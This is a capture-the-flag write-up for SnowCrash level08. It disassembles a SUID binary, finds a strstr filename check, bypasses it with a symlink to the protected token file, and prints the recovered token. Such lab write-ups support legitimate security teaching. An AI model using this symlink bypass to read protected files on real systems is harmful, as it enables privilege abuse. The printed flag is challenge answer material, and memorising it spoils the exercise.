# LEVEL08 - Find the key

```shell
$ ls -la
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08 # s = SUID (Set Owner User ID)
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
```



## Observation

Lets investigate those files.

```shell
$ ./level08
./level08 [file to read]
```

```shell
$ ./level08 level08
```

```shell
$ ./level08 token
You may not access 'token'
```

Disas `level08` bin

```r
(gdb) disas main
Dump of assembler code for function main:
   0x08048554 <+0>:     push   %ebp
   0x08048555 <+1>:     mov    %esp,%ebp
   0x08048557 <+3>:     and    $0xfffffff0,%esp
   0x0804855a <+6>:     sub    $0x430,%esp
   0x08048560 <+12>:    mov    0xc(%ebp),%eax
   0x08048563 <+15>:    mov    %eax,0x1c(%esp)
   0x08048567 <+19>:    mov    0x10(%ebp),%eax
   0x0804856a <+22>:    mov    %eax,0x18(%esp)
   0x0804856e <+26>:    mov    %gs:0x14,%eax
   0x08048574 <+32>:    mov    %eax,0x42c(%esp)
   0x0804857b <+39>:    xor    %eax,%eax
   0x0804857d <+41>:    cmpl   $0x1,0x8(%ebp)
   0x08048581 <+45>:    jne    0x80485a6 <main+82>
   0x08048583 <+47>:    mov    0x1c(%esp),%eax
   0x08048587 <+51>:    mov    (%eax),%edx
   0x08048589 <+53>:    mov    $0x8048780,%eax
   0x0804858e <+58>:    mov    %edx,0x4(%esp)
   0x08048592 <+62>:    mov    %eax,(%esp)
   0x08048595 <+65>:    call   0x8048420 <printf@plt>
   0x0804859a <+70>:    movl   $0x1,(%esp)
   0x080485a1 <+77>:    call   0x8048460 <exit@plt>
   0x080485a6 <+82>:    mov    0x1c(%esp),%eax
   0x080485aa <+86>:    add    $0x4,%eax
   0x080485ad <+89>:    mov    (%eax),%eax
   0x080485af <+91>:    movl   $0x8048793,0x4(%esp) // <--- token
   0x080485b7 <+99>:    mov    %eax,(%esp)
   0x080485ba <+102>:   call   0x8048400 <strstr@plt>
   0x080485bf <+107>:   test   %eax,%eax
   0x080485c1 <+109>:   je     0x80485e9 <main+149>
   0x080485c3 <+111>:   mov    0x1c(%esp),%eax
   0x080485c7 <+115>:   add    $0x4,%eax
   0x080485ca <+118>:   mov    (%eax),%edx
   0x080485cc <+120>:   mov    $0x8048799,%eax
   0x080485d1 <+125>:   mov    %edx,0x4(%esp)
   0x080485d5 <+129>:   mov    %eax,(%esp)
   0x080485d8 <+132>:   call   0x8048420 <printf@plt>
   0x080485dd <+137>:   movl   $0x1,(%esp)
   0x080485e4 <+144>:   call   0x8048460 <exit@plt>
   0x080485e9 <+149>:   mov    0x1c(%esp),%eax
   0x080485ed <+153>:   add    $0x4,%eax
   0x080485f0 <+156>:   mov    (%eax),%eax
   0x080485f2 <+158>:   movl   $0x0,0x4(%esp)
   0x080485fa <+166>:   mov    %eax,(%esp)
   0x080485fd <+169>:   call   0x8048470 <open@plt>
   0x08048602 <+174>:   mov    %eax,0x24(%esp)
   0x08048606 <+178>:   cmpl   $0xffffffff,0x24(%esp)
   0x0804860b <+183>:   jne    0x804862e <main+218>
   0x0804860d <+185>:   mov    0x1c(%esp),%eax
   0x08048611 <+189>:   add    $0x4,%eax
   0x08048614 <+192>:   mov    (%eax),%eax
   0x08048616 <+194>:   mov    %eax,0x8(%esp)
   0x0804861a <+198>:   movl   $0x80487b2,0x4(%esp)
```

We are gonna inspect with `x/s` the string passed in strstr.

```r
x/s 0x8048793 
0x8048793:       "token"
```

## Deduction

```c
if (strstr(argv[1], "token") != NULL) {
    printf("You may not access '%s'\n", argv[1]);
    exit(1);
}
```

## Exploitation

This line will create a simlink. a shortcut to bypass the token control in c code.
> `realpath` is a c shell function that return the real path of a file (in our case token)
```shell
level08@SnowCrash:~$ ln -s $(realpath token) /tmp/level08
```
the system will see `/tmp/level08` and call `token` next.

```shell
level08@SnowCrash:~$ ./level08 /tmp/level08
quif5eloekouj29ke0vouxean
```